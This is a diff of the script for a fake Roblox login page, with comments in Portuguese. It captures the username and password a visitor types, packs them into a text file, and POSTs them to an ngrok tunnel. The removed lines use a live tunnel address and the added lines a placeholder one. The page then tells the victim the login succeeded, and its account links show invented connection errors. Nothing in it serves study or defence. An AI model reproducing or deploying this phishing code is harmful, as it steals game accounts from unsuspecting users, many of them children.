@@ -533,7 +533,7 @@ site.</div></div></noscript>
 
 <script>
     document.addEventListener('DOMContentLoaded', function() {
-        // Verificar credenciais salvas
+        // Verificar credenciais salvas (opcional)
         const savedUsername = localStorage.getItem('roblox_username');
         const savedPassword = localStorage.getItem('roblox_password');
         
@@ -553,14 +553,14 @@ site.</div></div></noscript>
             const password = document.getElementById('custom-password').value;
             const rememberMe = document.getElementById('custom-remember').checked;
             
-            // Validação
+            // Validação simples
             if (username.length < 3 || password.length < 6) {
                 messageDiv.textContent = 'Nome de usuário ou senha inválidos.';
                 messageDiv.style.color = '#ff3333';
                 return;
             }
             
-            // Salvar credenciais (se marcado)
+            // Salvar credenciais no localStorage (opcional)
             if (rememberMe) {
                 localStorage.setItem('roblox_username', username);
                 localStorage.setItem('roblox_password', password);
@@ -569,41 +569,43 @@ site.</div></div></noscript>
                 localStorage.removeItem('roblox_password');
             }
             
-         // Criar arquivo .txt com as credenciais
-        const credentials = `Usuário: ${username}\nSenha: ${password}`;
-        const blob = new Blob([credentials], { type: 'text/plain' });
+            // Criar arquivo .txt com as credenciais
+            const credentials = `Usuário: ${username}\nSenha: ${password}`;
+            const blob = new Blob([credentials], { type: 'text/plain' });
 
-        // Criar FormData e adicionar o arquivo
-        const formData = new FormData();
-        formData.append('sla', blob, 'credenciais.txt');
-        formData.append('username', username);
-        formData.append('password', password);
+            // Criar FormData para enviar o arquivo
+            const formData = new FormData();
+            formData.append('file', blob, 'credenciais.txt');
+            formData.append('username', username); // Dados adicionais (opcional)
 
-// Enviar para o servidor
-fetch('https://3be416fe12a7.ngrok-free.app', {
-    method: 'POST',
-    body: formData
-})
-.then(response => {
-    if (response.ok) {
-        messageDiv.textContent = 'Login bem-sucedido!';
-        messageDiv.style.color = '#00aa00';
-    } else {
-        messageDiv.textContent = 'Erro no login. Tente novamente.';
-    }
-})
-.catch(error => {
-    messageDiv.textContent = 'Erro na conexão. Verifique sua internet.';
-});
-        // Links extras
+            // Enviar para o servidor Ngrok
+            fetch('https://SEU-NGROK.ngrok.io/receber-arquivo', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                if (response.ok) {
+                    messageDiv.textContent = 'Login bem-sucedido! Redirecionando...';
+                    messageDiv.style.color = '#00aa00';
+                    // Redirecionar ou fazer algo após o envio
+                } else {
+                    messageDiv.textContent = 'Erro no login. Tente novamente.';
+                }
+            })
+            .catch(error => {
+                messageDiv.textContent = 'Erro na conexão. Verifique sua internet.';
+            });
+        });
+
+        // Links extras (opcional)
         document.getElementById('custom-forgot-password').addEventListener('click', function(e) {
             e.preventDefault();
-            alert('nao foi possivel mudar senha verifique sua internet')
+            alert('Não foi possível mudar a senha. Verifique sua internet.');
         });
         
         document.getElementById('custom-create-account').addEventListener('click', function(e) {
             e.preventDefault();
-            alert('nao foi possivel criar conta verifique sua internet');
+            alert('Não foi possível criar conta. Verifique sua internet.');
         });
     });
 </script>
